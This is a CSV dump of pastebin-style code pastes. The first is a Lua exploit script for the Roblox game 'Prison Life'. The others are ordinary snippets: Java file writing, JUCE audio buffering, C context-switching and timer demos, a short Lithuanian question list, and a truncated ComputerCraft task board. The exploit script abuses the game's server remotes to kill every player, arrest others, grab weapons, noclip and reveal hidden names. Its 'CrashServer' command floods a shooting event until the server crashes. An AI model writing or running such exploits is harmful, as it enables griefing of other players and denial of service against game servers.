id,title,username,language,date,content
gHXG00qB,Untitled,the-j,Lua,Sunday 28th of May 2023 06:34:07 PM CDT,"-- yay exploiting game yeah!

-- Instances:

local PL = Instance.new(""ScreenGui"")
local MainFrame = Instance.new(""Frame"")
local Corner = Instance.new(""UICorner"")
local ScrollingFrameCommands = Instance.new(""ScrollingFrame"")
local ScrollLabels = Instance.new(""Folder"")
local Title = Instance.new(""TextLabel"")
local Description = Instance.new(""Folder"")
local Descriptor = Instance.new(""TextLabel"")
local Corner_2 = Instance.new(""UICorner"")
local MainTitle = Instance.new(""TextLabel"")
local Corner_3 = Instance.new(""UICorner"")
local Executor = Instance.new(""TextButton"")
local Corner_4 = Instance.new(""UICorner"")
local CommandBar = Instance.new(""TextBox"")
local Corner_5 = Instance.new(""UICorner"")
local SwitchFrame = Instance.new(""TextButton"")
local Corner_6 = Instance.new(""UICorner"")

--Properties:

PL.Name = ""PL""
PL.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
PL.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = ""MainFrame""
MainFrame.Parent = PL
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.784710407, 0, 0.339702725, 0)
MainFrame.Size = UDim2.new(0.21473597, 0, 0.318577498, 0)

Corner.Name = ""Corner""
Corner.Parent = MainFrame

ScrollingFrameCommands.Name = ""ScrollingFrameCommands""
ScrollingFrameCommands.Parent = MainFrame
ScrollingFrameCommands.Active = true
ScrollingFrameCommands.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
ScrollingFrameCommands.BorderSizePixel = 0
ScrollingFrameCommands.Position = UDim2.new(0, 0, 0.158280194, 0)
ScrollingFrameCommands.Size = UDim2.new(0.5, 0, 0.674941719, 0)

ScrollLabels.Name = ""ScrollLabels""
ScrollLabels.Parent = ScrollingFrameCommands

Title.Name = ""Title""
Title.Parent = ScrollLabels
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Size = UDim2.new(1, 0, 0.0500000007, 0)
Title.Font = Enum.Font.SourceSans
Title.Text = ""Commands:""
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

Description.Name = ""Description""
Description.Parent = MainFrame

Descriptor.Name = ""Descriptor""
Descriptor.Parent = Description
Descriptor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Descriptor.Position = UDim2.new(0, 0, 0.99966687, 0)
Descriptor.Size = UDim2.new(1, 0, 0.400000006, 0)
Descriptor.Visible = false
Descriptor.Font = Enum.Font.SourceSans
Descriptor.Text = """"
Descriptor.TextColor3 = Color3.fromRGB(0, 0, 0)
Descriptor.TextScaled = true
Descriptor.TextSize = 14.000
Descriptor.TextWrapped = true

Corner_2.Name = ""Corner""
Corner_2.Parent = Descriptor

MainTitle.Name = ""MainTitle""
MainTitle.Parent = MainFrame
MainTitle.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
MainTitle.Size = UDim2.new(1, 0, 0.125, 0)
MainTitle.Font = Enum.Font.SourceSans
MainTitle.Text = ""Prison Life""
MainTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
MainTitle.TextScaled = true
MainTitle.TextSize = 14.000
MainTitle.TextWrapped = true

Corner_3.Name = ""Corner""
Corner_3.Parent = MainTitle

Executor.Name = ""Executor""
Executor.Parent = MainFrame
Executor.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
Executor.Position = UDim2.new(-3.02633623e-07, 0, 0.874708414, 0)
Executor.Size = UDim2.new(1, 0, 0.125, 0)
Executor.Font = Enum.Font.SourceSans
Executor.Text = ""Execute Command""
Executor.TextColor3 = Color3.fromRGB(0, 0, 0)
Executor.TextScaled = true
Executor.TextSize = 14.000
Executor.TextWrapped = true

Corner_4.Name = ""Corner""
Corner_4.Parent = Executor

CommandBar.Name = ""CommandBar""
CommandBar.Parent = MainFrame
CommandBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
CommandBar.Position = UDim2.new(0.57516849, 0, 0.33322227, 0)
CommandBar.Size = UDim2.new(0.35950017, 0, 0.333288938, 0)
CommandBar.Font = Enum.Font.SourceSans
CommandBar.Text = ""Commands in here!""
CommandBar.TextColor3 = Color3.fromRGB(0, 0, 0)
CommandBar.TextScaled = true
CommandBar.TextSize = 14.000
CommandBar.TextWrapped = true

Corner_5.Name = ""Corner""
Corner_5.Parent = CommandBar

SwitchFrame.Name = ""SwitchFrame""
SwitchFrame.Parent = PL
SwitchFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwitchFrame.Position = UDim2.new(0.958262265, 0, 0.262738854, 0)
SwitchFrame.Size = UDim2.new(0.0403747819, 0, 0.0761146545, 0)
SwitchFrame.Font = Enum.Font.SourceSans
SwitchFrame.Text = "">""
SwitchFrame.TextColor3 = Color3.fromRGB(0, 0, 0)
SwitchFrame.TextScaled = true
SwitchFrame.TextSize = 14.000
SwitchFrame.TextWrapped = true

Corner_6.Name = ""Corner""
Corner_6.Parent = SwitchFrame

-- Scripts:

local function LRBLGN_fake_script() -- ScrollLabels.AssembleAll 
	local script = Instance.new('LocalScript', ScrollLabels)

	local mainframe = script.Parent.Parent.Parent
	local descriptor = mainframe.Description.Descriptor
	local scroll_labels = script.Parent
	local exec = mainframe.Executor
	local cmdbar = script.Parent.Parent.Parent.CommandBar
	local players = game:GetService(""Players"")
	local plr = players.LocalPlayer
	local mouse = plr:GetMouse()
	
	local switchframebutton = mainframe.Parent.SwitchFrame
	local framevisible = true
	
	switchframebutton.MouseEnter:Connect(function()
		if framevisible == false then
			switchframebutton.BackgroundTransparency = 0
			switchframebutton.TextTransparency = 0
		end
	end)
	switchframebutton.MouseLeave:Connect(function()
		if framevisible == false then
			switchframebutton.BackgroundTransparency = 1
			switchframebutton.TextTransparency = 1
		end
	end)
	
	switchframebutton.MouseButton1Up:Connect(function()
		framevisible = not framevisible
		if framevisible == false then
			mainframe.Position = UDim2.new(1, 0, 0.34, 0)
			switchframebutton.BackgroundTransparency = 1
			switchframebutton.TextTransparency = 1
			switchframebutton.Text = ""<""
		else
			mainframe.Position = UDim2.new(0.785, 0, 0.34, 0)
			switchframebutton.Text = "">""
			switchframebutton.BackgroundTransparency = 0
			switchframebutton.TextTransparency = 0
		end
	end)
	
	local TWEENING_BUSY = false
	
	local showdesc = function(reverseProcess, isError)
		if TWEENING_BUSY == true and isError == false then
			return
		end
		TWEENING_BUSY = true
		if isError then
			descriptor.TextTransparency = 1
			descriptor.BackgroundTransparency = 1
			descriptor.Visible = false
			task.wait(.3)
		end
		if reverseProcess then
			for i = 1, 30 do
				descriptor.BackgroundTransparency = i/30
				descriptor.TextTransparency = i/30
				task.wait()
			end
			descriptor.Visible = false
		else
			descriptor.Visible = true
			for i = 1, 30 do
				descriptor.BackgroundTransparency = 1 - i/30
				descriptor.TextTransparency = 1 - i/30
				task.wait()
			end
		end
		TWEENING_BUSY = false
	end
	
	local addcmd = function(name, desc, func, hasArgs, typeOfArg)
		-- creates the label
		
		local total = 0
		for _, obj in pairs(scroll_labels:GetChildren()) do
			if obj:IsA(""TextLabel"") then
				total += 1
			end
		end
		local lbl = Instance.new(""TextLabel"", scroll_labels)
		lbl.Name = ""Label_"" .. name
		lbl.Text = name
		lbl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		lbl.BackgroundTransparency = 1.000
		lbl.Size = UDim2.new(1, 0, 0.05, 0)
		lbl.Position = UDim2.new(0, 0, total*0.05, 0)
		lbl.Font = Enum.Font.SourceSans
		lbl.TextColor3 = Color3.fromRGB(0, 0, 0)
		lbl.TextScaled = true
		lbl.TextSize = 14.000
		lbl.TextWrapped = true
		
		-- handling of description stuff
		
		local insertdesc = function()
			lbl.MouseLeave:Connect(function()
				descriptor.TextTransparency = 1
				descriptor.BackgroundTransparency = 1
				descriptor.Visible = false
				descriptor.Text = """"
			end)
			descriptor.TextTransparency = 0
			descriptor.BackgroundTransparency = 0
			descriptor.Visible = true
		end
		
		-- inserts description for the command
		
		lbl.MouseEnter:Connect(function()
			local stop = false
			local conn = lbl.MouseLeave:Connect(function()
				stop = true
			end)
			task.wait(.2)
			if stop == false then
				conn:Disconnect()
				descriptor.Text = desc
				insertdesc()
			end
			task.wait(1)
			if stop == false then
				cmdbar.Text = name
				if hasArgs then
					if typeOfArg == ""string"" then
						cmdbar.Text = cmdbar.Text .."" "".. plr.Name
					elseif typeOfArg == ""number"" then
						cmdbar.Text = cmdbar.Text .."" "".. tostring(math.random(16,75))
					end
				end
			end
		end)
		
		-- loads when the executor is clicked on
		
		exec.MouseButton1Up:Connect(function()
			local text = cmdbar.Text:lower()
			local lname = name:lower()
			if not string.find(text, lname) then return end
			if hasArgs then
				local args = string.sub(text, lname:len()+1, text:len())
				if typeOfArg == ""number"" then
					args = tonumber(args)				
				end
				if string.find(args, "" "") then
					if string.split(args, "" "")[2] == """" then
						args = string.split(args, "" "")[1]
					else
						args = string.split(args, "" "")[2]
					end
				end
				func(args)
			else
				func()
			end
		end)
	end
	
	-- main functions and stuff or wtv
	local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
	local Items = workspace[""Prison_ITEMS""]
	local Giver = Items.giver
	
	local function checkRoot()
		if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
			if plr.Character:FindFirstChild(""Humanoid"") and plr.Character:FindFirstChild(""Humanoid"").Health ~= 0 then
				return true
			end
		end
		return false
	end
	
	local function teleportTo(isCFrame, arg)
		if checkRoot() then
			if isCFrame then
				plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame = arg
			else
				plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame = arg.CFrame + Vector3.new(0,5,0)
			end
		end
	end
	
	local T_Remington870 = Giver:FindFirstChild(""Remington 870""):FindFirstChild(""ITEMPICKUP"")
	local T_M9 = Giver:FindFirstChild(""M9""):FindFirstChild(""ITEMPICKUP"")
	local T_AK47 = Giver:FindFirstChild(""AK-47""):FindFirstChild(""ITEMPICKUP"")
	
	local meleeEvent = ReplicatedStorage.meleeEvent
	
	local function grabItem(itempickup)
		if checkRoot() then
			local rootpart = plr.Character:FindFirstChild(""HumanoidRootPart"")
			local cf = rootpart.CFrame
			teleportTo(false, itempickup)
			if plr.Character:FindFirstChild(""Humanoid"") then
				plr.Character:FindFirstChild(""Humanoid""):ChangeState(Enum.HumanoidStateType.Running)
				plr.Character:FindFirstChild(""Humanoid""):ChangeState(Enum.HumanoidStateType.Running)
			end
			workspace:WaitForChild(""Remote""):WaitForChild(""ItemHandler""):InvokeServer(itempickup) -- wont tp u back if not on the main game because it waits for a response
			workspace:WaitForChild(""Remote""):WaitForChild(""ItemHandler""):InvokeServer(itempickup)
			workspace:WaitForChild(""Remote""):WaitForChild(""ItemHandler""):InvokeServer(itempickup)
			task.wait(.4)
			teleportTo(true, cf)
		end
	end
	
	addcmd(""GrabRemington"", ""Grabs the Remington"", function()
		grabItem(T_Remington870)
	end)
	addcmd(""GrabM9"", ""Grabs the M9"", function()
		grabItem(T_M9)
	end)
	addcmd(""GrabAK47"", ""Grabs the AK47"", function()
		grabItem(T_AK47)
	end)
	
	addcmd(""CrashServer"", ""Uses the Remington870 to crash the running server"", function() -- skidded lol
		grabItem(T_Remington870)
		if not checkRoot() then return end
		local rem
		for i, v in pairs(plr.Backpack:GetChildren()) do
			if v.Name == ""Remington 870"" then
				v.Parent = plr.Character
				rem = v
				break
			end
		end
		if not rem then return end
		plr.Character:FindFirstChildOfClass(""Humanoid""):UnequipTools()
	
		while game:GetService(""RunService"").Stepped:Wait() do
			for count = 0, 50, 50 do
				coroutine.resume(coroutine.create(function()
					local bulletTable = {}
					table.insert(bulletTable, {
						Hit = nil,
						Distance = 100,
						Cframe = CFrame.new(0,1,1),
						RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
					})
					ReplicatedStorage.ShootEvent:FireServer(bulletTable, rem)
					task.wait()
				end))
			end
		end
	end)
	
	addcmd(""KillAura"", ""Kills those that are around you"", function()
		for i = 1, 250 do
			for i, e in pairs(game.Players:GetPlayers()) do
				if e ~= plr then
					meleeEvent:FireServer(e)
				end
			end
		end
	end)
	
	addcmd(""KillAll"", ""Uses Kill Aura's remote method to teleport to everyone and kill them all"", function()
		if not checkRoot() then return end
		local cf = plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame
	
		local getplrs = game.Players:GetPlayers()
		for i = 1, #getplrs do
			local otherplr = getplrs[i]
			if otherplr == plr then continue end
			if otherplr and otherplr.Character and otherplr.Character:FindFirstChild(""Humanoid"") then
				local otherchar = otherplr.Character
				if otherchar:FindFirstChild(""HumanoidRootPart"") then
					local other_rp = otherchar:FindFirstChild(""HumanoidRootPart"")
					local other_hum = otherchar:FindFirstChild(""Humanoid"")
					repeat teleportTo(false, other_rp) meleeEvent:FireServer(otherplr) task.wait() until other_hum.Health < 1 or not other_rp  or otherchar:FindFirstChild(""ForceField"")
				else
					continue
				end
			else
				continue
			end
		end
	
		teleportTo(true, cf)
	end)
	
	addcmd(""Kill"", ""Kill [player] - Can be shortened, but must be the original username and not display name"", function(name)
		if not checkRoot() then return end
		local cf = plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame
		
		name = name:lower()
		local len = name:len()
		local affectedplayer = nil
		local plrs = players:GetPlayers()
		
		for i, v in pairs(plrs) do
			if v.Name:lower() == name then
				affectedplayer = v
			end
		end
		
		if affectedplayer == nil then
			for i, v in pairs(plrs) do
				if string.find(string.sub(v.Name:lower(), 1, len), name) then
					affectedplayer = v
				end
			end
		end
		
		if affectedplayer == nil or affectedplayer == plr then return end
		if affectedplayer and affectedplayer.Character and affectedplayer.Character:FindFirstChild(""Humanoid"") then
			local otherchar = affectedplayer.Character
			if otherchar:FindFirstChild(""HumanoidRootPart"") then
				local other_rp = otherchar:FindFirstChild(""HumanoidRootPart"")
				local other_hum = otherchar:FindFirstChild(""Humanoid"")
				repeat teleportTo(false, other_rp) meleeEvent:FireServer(affectedplayer) task.wait() until other_hum.Health < 1 or not other_rp
			end
		end
		teleportTo(true, cf)
	end, true, ""string"")
	
	addcmd(""GetKeyCard"", ""Grabs a random key card from the ground; Does not do anything if none can be found"", function()
		local KC = Items.single:FindFirstChild(""Key card"")
		if not checkRoot() or not KC then return end
		
		local cf = plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame
		teleportTo(false, KC:FindFirstChild(""ITEMPICKUP""))
		
		for i = 1, 3 do workspace:WaitForChild(""Remote""):WaitForChild(""ItemHandler""):InvokeServer() end
		task.wait(.2)
		teleportTo(true, cf)
	end)
	
	addcmd(""Arrest"", ""Arrest [player] - Can be shortened, but must be the original username and not display name"", function(name)
		if not checkRoot() then return end
		local cf = plr.Character:FindFirstChild(""HumanoidRootPart"").CFrame
	
		name = name:lower()
		local len = name:len()
		local affectedplayer = nil
		local plrs = players:GetPlayers()
	
		for i, v in pairs(plrs) do
			if v.Name:lower() == name then
				affectedplayer = v
			end
		end
	
		if affectedplayer == nil then
			for i, v in pairs(plrs) do
				if string.find(string.sub(v.Name:lower(), 1, len), name) then
					affectedplayer = v
				end
			end
		end
	
		if affectedplayer == nil or affectedplayer == plr then return end
		if affectedplayer and affectedplayer.Character and affectedplayer.Character:FindFirstChild(""Head"") then
			local otherchar = affectedplayer.Character
			teleportTo(false, otherchar.Head)
			for i = 1, 3 do
				workspace:WaitForChild(""Remote""):WaitForChild(""arrest""):InvokeServer(otherchar.Head)
				workspace:WaitForChild(""Remote""):WaitForChild(""ItemHandler""):InvokeServer(otherchar.Head)
			end
			task.wait(.2)
			teleportTo(true, cf)
		end
	end, true, ""string"")
	
	addcmd(""RealPlayerNames"", ""Gives players a Billboard gui providing the true name [Switchable]"", function()
		local function givegui(v, head)
			local gui = Instance.new(""BillboardGui"", head)
			gui.Size = UDim2.new(7,0,2,0)
			gui.StudsOffset = Vector3.new(0,2,0)
			gui.AlwaysOnTop = true
			local text = Instance.new(""TextLabel"", gui)
			text.BackgroundTransparency = 1
			text.Text = v.Name
			text.Size = UDim2.new(1,0,1,0)
			text.TextScaled = true
		end
		for i, v in pairs(game:GetService(""Players""):GetPlayers()) do
			task.spawn(function()
				local char = v.Character or v.CharacterAdded:Wait()
				repeat task.wait() until char:FindFirstChild(""Head"")
				givegui(v, char:FindFirstChild(""Head""))
				v.CharacterAdded:Connect(function(newchar)
					char = newchar
					repeat task.wait(.1) until char:FindFirstChild(""Head"")
					givegui(v, char:FindFirstChild(""Head""))
				end)
			end)
		end
	end)
	
	addcmd(""ESP"", ""Puts a highlight in every player's character"", function()
		local function givehl(v, char)
			local hl = Instance.new(""Highlight"", char)
			hl.FillColor = Color3.fromRGB(255,255,255)
			hl.OutlineTransparency = 1
		end
		for i, v in pairs(game:GetService(""Players""):GetPlayers()) do
			task.spawn(function()
				local char = v.Character or v.CharacterAdded:Wait()
				givehl(v, char)
				v.CharacterAdded:Connect(function(newchar)
					char = newchar
					repeat task.wait(.1) until char:FindFirstChild(""Humanoid"")
					givehl(v, char)
				end)
			end)
		end
	end)
	
	local Lighting = game.Lighting
	local switchToDay = false
	local originalTime = 0
	
	task.spawn(function() -- lighting
		Lighting:GetPropertyChangedSignal(""ClockTime""):Connect(function()
			if switchToDay then
				Lighting.ClockTime = 14.5
			end
		end)
		Lighting.ClockTime = Lighting.ClockTime + 0.01
		Lighting.ClockTime = Lighting.ClockTime - 0.01
	end)
	
	addcmd(""AlwaysDay"", ""Screw night time! [Switchable]"", function()
		switchToDay = not switchToDay
		if switchToDay == true then
			originalTime = Lighting.ClockTime
			Lighting.ClockTime = 14.5
		else
			Lighting.ClockTime = originalTime
		end
	end)
	
	-- walkspeed and jumppower and noclip stuff
	
	local noclip = false
	
	local walkspeed = 16
	local jumppower = 50
	local overridehumanoidproperties = false
	
	task.spawn(function()
		local char = plr.Character or plr.CharacterAdded:Wait()
		repeat task.wait() until char:FindFirstChild(""Humanoid"")
		local hum = char:FindFirstChild(""Humanoid"")
		hum.UseJumpPower = true
	
		plr.CharacterRemoving:Connect(function()
			char = nil; hum = nil
		end)
		plr.CharacterAdded:Connect(function(c)
			task.wait()
			char = c
			repeat task.wait() until char:FindFirstChild(""Humanoid"")
			hum = char:FindFirstChild(""Humanoid"")
			hum.UseJumpPower = true
		end)
		
		game:GetService(""RunService"").Stepped:Connect(function()
			if checkRoot() and char then
				plr.Character:FindFirstChild(""Torso"").CanCollide = not noclip
				plr.Character:FindFirstChild(""Head"").CanCollide = not noclip
			end
		end)
	
		while task.wait() do
			if char and hum and hum.WalkSpeed and hum.WalkSpeed ~= 0 and not overridehumanoidproperties then
				hum.WalkSpeed = walkspeed
			end
			if char and hum and hum.JumpPower and not overridehumanoidproperties then
				hum.JumpPower = jumppower
			end
		end
	end)
	
	addcmd(""SwitchNoclip"", ""Switches the ability to go through walls and roofs"", function()
		noclip = not noclip
	end)
	
	addcmd(""SetWalkSpeed"", ""SetWalkSpeed [walkspeed]"", function(new)
		walkspeed = new
	end, true, ""number"")
	
	addcmd(""SetJumpPower"", ""SetJumpPower [jumpPower]"", function(new)
		jumppower = new
	end, true, ""number"")
	
	addcmd(""OverrideWSJP"", ""Overrides WalkSpeed and JumpPower so it is eventually set by default [Switchable obviously lol]"", function()
		overridehumanoidproperties = not overridehumanoidproperties
	end)
	
	addcmd(""Rejoin"", ""Self-explanatory"", function()
		game:GetService(""TeleportService""):Teleport(game.PlaceId)
	end)
end
coroutine.wrap(LRBLGN_fake_script)()
"
cSrWUBg2,Регистрация пользователей,Tsaregorodtsev,Java,Sunday 28th of May 2023 05:47:00 PM CDT,"public class Main {
    public static void main(String[] args) {
        String filename = ""users.dat"";
        File inputFile = new File(filename);
        ArrayList<String> lines = new ArrayList<>();
        try (Reader fileReader = new FileReader(inputFile, StandardCharsets.UTF_8);
             BufferedReader bufferedReader = new BufferedReader(fileReader)) {
            while (bufferedReader.ready()) {
                lines.add(bufferedReader.readLine());
            }
        } catch (IOException ignored) {
            System.out.println(""Ошибка чтения."");
        }
        for (int i = 2; i <= lines.size() - 91; i++) {
            String[] data = lines.get(i).split("","");
            File outputFile = new File(data[0]);
            try (Writer fileWriter = new FileWriter(outputFile, StandardCharsets.UTF_8,false)) {
                fileWriter.write(data[1] + '\n'
                                    + data[2] + "";"" + data[3] + '\n'
                                    + data[5] + '\n'
                                    + data[6] + '\n'
                                    + "";"" + '\n');
                System.out.println(""Файл с пользователем "" + data[0] + "" создан."");
            } catch (IOException ignored) {
                System.out.println(""Ошибка записи файла."");
            }
        }
    }
}"
n1v16cRP,Untitled,olivercromwell,C++,Sunday 28th of May 2023 05:46:15 PM CDT,"
Filter filter_left;
Filter filter_right;


std::array<float, 8192> arr_left = {};
std::array<float, 8192> arr_right = {};
#include <deque>
#include <array>


std::deque<float> output_buffer_left;
std::deque<float> output_buffer_right;
std::deque<float> buffer_left;
std::deque<float> buffer_right;

void SSBCleanupProcessorAudioProcessor::processBlock(juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages) {

    juce::ScopedNoDenormals noDenormals;
    auto totalNumInputChannels = getTotalNumInputChannels();
    auto totalNumOutputChannels = getTotalNumOutputChannels();
    auto numSamples = buffer.getNumSamples();
	auto* audiobufferleft = buffer.getWritePointer(0);
	auto* audiobufferright = buffer.getWritePointer(1);

    filter_left.setConstant(entropyValue);
    filter_left.set_NBINS(binsValue);
    filter_right.setConstant(entropyValue);
    filter_right.set_NBINS(binsValue);



    for (int i = 0; i < numSamples; ++i) {
		buffer_left.push_back(audiobufferleft[i]);
		buffer_right.push_back(audiobufferright[i]);
	}

	if (buffer_left.size() >= 8192) {
		int multiples = buffer_left.size() / 8192;
		int remainder = buffer_left.size() % 8192;

		for (int m = 0; m < multiples; ++m) {
			for (int i = 0; i < 8192; ++i) {
				arr_left[i] = buffer_left[m * 8192 + i];
			}

			// Process and push to output_buffer_left...
			arr_left = filter_left.process(arr_left);

			for (const auto& sample : arr_left) {
				output_buffer_left.push_back(sample);
			}
		}

		// Move the remaining values to the front of the buffer
		for (int i = 0; i < remainder; ++i) {
			buffer_left[i] = buffer_left[multiples * 8192 + i];
		}

		// Erase the processed values
		for (int i = 0; i < (buffer_left.size() - remainder); ++i) {
			buffer_left.pop_front();
		}
	}

	if (buffer_right.size() >= 8192) {
		int multiples = buffer_right.size() / 8192;
		int remainder = buffer_right.size() % 8192;

		for (int m = 0; m < multiples; ++m) {
			for (int i = 0; i < 8192; ++i) {
				arr_right[i] = buffer_right[m * 8192 + i];
			}

			// Process and push to output_buffer_left...
			arr_right = filter_right.process(arr_right);
			for (const auto& sample : arr_right) {
				output_buffer_right.push_back(sample);
			}
		}

		// Move the remaining values to the front of the buffer
		for (int i = 0; i < remainder; ++i) {
			buffer_right[i] = buffer_right[multiples * 8192 + i];
		}

		// Erase the processed values
		for (int i = 0; i < (buffer_left.size() - remainder); ++i) {
			buffer_right.pop_front();
		}
	}
	int availableSamples_left = output_buffer_left.size();
	int samplesToCopy_left = std::min(numSamples, availableSamples_left);

	// Copy samples to the output buffer
	std::copy(output_buffer_left.begin(), output_buffer_left.begin() + samplesToCopy_left, audiobufferleft);

	// Erase used samples from the beginning of the buffer
	for (int i = 0; i <  samplesToCopy_left; ++i) {
		output_buffer_left.pop_front();
	}

	// If there were not enough samples in the buffer, fill the rest of the output with zeros- skipping 
	if (samplesToCopy_left < numSamples) {
		std::fill(audiobufferleft + samplesToCopy_left, audiobufferleft + numSamples, 0.0f);
	}
	int availableSamples_right = output_buffer_right.size();
	int samplesToCopy_right = std::min(numSamples, availableSamples_right);

	// Copy samples to the output buffer
	std::copy(output_buffer_right.begin(), output_buffer_right.begin() + samplesToCopy_right, audiobufferright);

	// Erase used samples from the beginning of the buffer
	for (int i = 0; i < samplesToCopy_right; ++i) {
		output_buffer_right.pop_front();
	}
	// If there were not enough samples in the buffer, fill the rest of the output with zeros
	if (samplesToCopy_right < numSamples) {
		std::fill(audiobufferright + samplesToCopy_right, audiobufferright + numSamples, 0.0f);
	}
}"
VtBNR0NE,conclusions,Nojus_Globys,Java,Sunday 28th of May 2023 05:23:09 PM CDT,"Ką išmokote?
Ką prisiminėte?
Ką mokate?
Ką norite išmokti?"
KweeHz9j,tcb,moldovexc,C,Sunday 28th of May 2023 05:13:56 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <ucontext.h>
#include <signal.h>

typedef struct task_t task_t;
struct task_t {
    ucontext_t context;
    char task_char;
    task_t *next;
};

task_t TaskQueue;    
task_t *RunningTask;

void add_task_to_queue(task_t *new_task) {
    new_task->next = NULL;

    if (TaskQueue.next == NULL) {
        TaskQueue.next = new_task;
    } else {
        task_t *last_task = TaskQueue.next;
        while (last_task->next != NULL) {
            last_task = last_task->next;
        }
        last_task->next = new_task;
    }
}

task_t* get_next_task() {
    if (TaskQueue.next == NULL) {
        return NULL;
    }

    task_t *next_task = TaskQueue.next;
    TaskQueue.next = next_task->next;
    next_task->next = NULL;
    return next_task;
}

void task_function() {
    while (1) {
        printf(""%c"", RunningTask->task_char);  // Print the character associated with the task
        swapcontext(&RunningTask->context, &TaskQueue.context);
    }
}

int create_task(void (*start_routine)(), char task_char) {
    task_t *new_task = (task_t*) malloc(sizeof(task_t));
    if (new_task == NULL) {
        return -1;
    }

    getcontext(&new_task->context);
    new_task->context.uc_stack.ss_sp = malloc(SIGSTKSZ);
    new_task->context.uc_stack.ss_size = SIGSTKSZ;
    new_task->context.uc_link = &TaskQueue.context;

    new_task->task_char = task_char;

    makecontext(&new_task->context, task_function, 0);

    add_task_to_queue(new_task);

    return 0;
}

int main() {
    create_task(NULL, '+');  
    create_task(NULL, '-');
    create_task(NULL, '!');

    RunningTask = get_next_task();

    while (1) {
        if (RunningTask == NULL) {
            printf(""\nAll tasks completed!\n"");
            exit(0);
        }

        task_t *next_task = get_next_task();
        if (next_task != NULL) {
            add_task_to_queue(RunningTask);
            RunningTask = next_task;
        }

        swapcontext(&TaskQueue.context, &RunningTask->context);
    }

    return 0;
}
"
BKfZG2YL,timer,moldovexc,C,Sunday 28th of May 2023 05:12:49 PM CDT,"
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/time.h>

int virtualClock = 0;

void signalHandler(int signum)
{
    // Increment virtual clock value by 1 second
    virtualClock++;
    
    // Output the virtual clock value
    printf(""Virtual Clock: %d seconds\n"", virtualClock);
}

int main()
{
    // Set up the signal handler
    struct sigaction sa;
    sa.sa_handler = signalHandler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGALRM, &sa, NULL);

    // Set up the timer
    struct itimerval timer;
    timer.it_interval.tv_sec = 1;       // 1 second interval
    timer.it_interval.tv_usec = 0;
    timer.it_value = timer.it_interval;
    setitimer(ITIMER_REAL, &timer, NULL);

    // Wait indefinitely
    while (1) {
        sleep(1);
    }

    return 0;
}
"
K0zpfpwy,Untitled,FoxPit,Lua,Sunday 28th of May 2023 05:08:54 PM CDT,"-- Define color constants
local colors = {
    red = colors.red,
    green = colors.green,
    yellow = colors.yellow,
    white = colors.white,
    cyan = colors.cyan
}

-- Back up the original event pull
local old_pullEvent = os.pullEvent
os.pullEvent = os.pullEventRaw

-- Set the console input and password
local code = ""terminate""
local password = ""password""

-- Find the monitor
local monitor = peripheral.wrap(""left"") -- Monitor side is 'left'

-- A build board to store tasks
local buildBoard = {}

-- Function for password authentication
local function authenticate()
    while true do
        term.clear()
        term.setCursorPos(1,1)
        term.write(""Console: "")
        local input = read()

        if input == code then
            term.write(""Password: "")
            local input2 = read(""*"")

            if input2 == password then
                return
            end
            print(""Wrong password. Please try again."")
        elseif input == ""board"" then
            print(""Starting board program..."")
            runProgram()
        elseif input == ""exit"" then
            term.clear()
            term.setCursorPos(1,1)
            return
        else
            print(""Unknown command. Please try again."")
        end
        sleep(2)
    end
end

-- Restore the original event pull
os.pullEvent = old_pullEvent

-- Functions for task management
local function addTask(task)
    table.insert(buildBoard, task)
    monitor.setCursorPos(1, 4)
    monitor.setTextColor(colors.green)
    monitor.write(""Task added: "" .. task)
    sleep(2)
end

local function removeTask(index)
    if buildBoard[index] then
        local removedTask = table.remove(buildBoard, index)
        monitor.setCursorPos(1, 4)
        monitor.setTextColor(colors.red)
        monitor.write(""Task removed: "" .. removedTask)
    else
        monitor.setCursorPos(1, 4)
        monitor.setTextColor(colors.red)
        monitor.write(""Invalid task index."")
    end
    sleep(2)
end

local function displayTasks()
    monitor.setCursorPos(1, 4)
    monitor.setTextColor(colors.cyan)
    monitor.write(""Build Board Tasks:"")
    for index, task in ipairs(buildBoard) do
        monitor.setCursorPos(1, index + 4)
        monitor.write(index .. "". "" .. task)
    end
    sleep(2)
end

-- Main program loop
local function runProgram()
    local running = true
    while running do
        monitor.clear()
        monitor.setCursorPos(1,1)
        monitor.setTextColor(colors.yellow)
        monitor.write(""=== Build Board Program ==="")
        monitor.setCursorPos(1,2)
        monitor.setTextColor(colors.white)
        monitor.write(""1. Add task"")
        monitor.setCursorPos(1,3)
        monitor.write(""2. Remove task"")
        monitor.setCursorPos(1,4)
        monitor.write(""3. Display tasks"")
        monitor.setCursorPos(1,5)
        monitor.write(""4. Exit"")

        local event, player, message = os.pullEvent(""chat"")

        if message == ""1"" then
            monitor.setCursorPos(1,6)
            monitor.write(""Enter task:"")
            local event, player, task = os.pullEvent(""chat"")
            addTask(task)
        elseif message == ""2"" then
            monitor.setCursorPos(1,6)
            monitor.write(""Enter task index:"")
            local event, player, indexMessage = os.pullEvent(""chat"")
            local index = tonumber(indexMessage)
            if index then
                removeTask(index)
            else
                monitor.setCursorPos(1,6)
                monitor.setTextColor(colors.red)
